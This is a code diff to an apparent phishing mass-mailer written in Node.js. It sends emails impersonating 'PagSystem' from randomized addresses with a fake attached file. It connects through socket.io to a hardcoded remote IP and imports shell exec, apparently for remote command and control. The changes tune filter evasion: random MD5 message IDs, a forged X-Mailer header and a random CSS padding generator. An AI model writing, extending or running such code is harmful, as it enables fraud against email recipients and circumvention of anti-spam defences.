@@ -1,6 +1,7 @@
 const nodemailer = require("nodemailer");
 const htmlToText = require("nodemailer-html-to-text").htmlToText;
 var randomstring = require("randomstring");
+const crypto = require('crypto')
 const { exec } = require("child_process");
 var io = require("socket.io-client");
 var socket = io.connect("http://173.212.219.58:3000", { reconnect: true });
@@ -240,21 +241,20 @@ async function sendEmail(email) {
     const buff = Buffer.from(fakefile, "utf-8");
     // decode buffer as Base64
     const base64 = buff.toString("base64");
-    let nome = "PagSystem";
+    let nome = "PagSystens";
+    let idmensagex = await IDgenerator();
+    console.log(idmensagex);
     let info = await transporter.sendMail({
       from:
-        "=?UTF-8?B?" +
-        Buffer.alloc(nome.length, nome).toString("base64") +
-        "?=" +
+        nome +
         " <" +
         "pagsystem" +
         randomstring.generate(between(3, 5)) +
         "@" +
         hostName +
         ">",
-      replyTo: "=?UTF-8?B?" +
-        Buffer.alloc(nome.length, nome).toString("base64") +
-        "?=" +
+      replyTo: 
+        nome +
         " <" +
         "pagsystem" +
         randomstring.generate(between(3, 5)) +
@@ -262,20 +262,15 @@ async function sendEmail(email) {
         hostName +
         ">", 
       to: mailarray[0],
-      subject: {
-        prepared: true,
-        value:
-          "=?UTF-8?B?" +
-          Buffer.alloc(subject.length, subject).toString("base64") +
-          "?=",
-      },
+      subject: subject,
       html: html,
       textEncoding: "base64",
       encoding: "utf-8",
+      messageId: idmensagex + "@" + hostName,
       headers: {
         "X-mb": "yes",
         "X-Priority": 3,
-        "X-Mailer": "PHPMailer 5.2.4 (http://code.google.com/a/apache-extras.org/p/phpmailer/)",
+        "X-Mailer": "PHPMailer 12.7.5 (https://github.com/PHPMailer/PHPMailer)",
         "List-Unsubscribe": `<mailto:pagsystem@${hostName}?subject=unsubscribe>`,
       },
       /* attachments: [
@@ -414,6 +409,15 @@ function formataCNPJ(cnpj) {
 function sleep(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
+
+async function IDgenerator() {
+  let randomico = await randomstring.generate({
+    length: 100,
+  });
+  let hash = crypto.createHash('md5').update(randomico).digest("hex");
+  return hash;
+}
+
 
 async function cssgenerator() {
   let linhas = between(500, 1000);
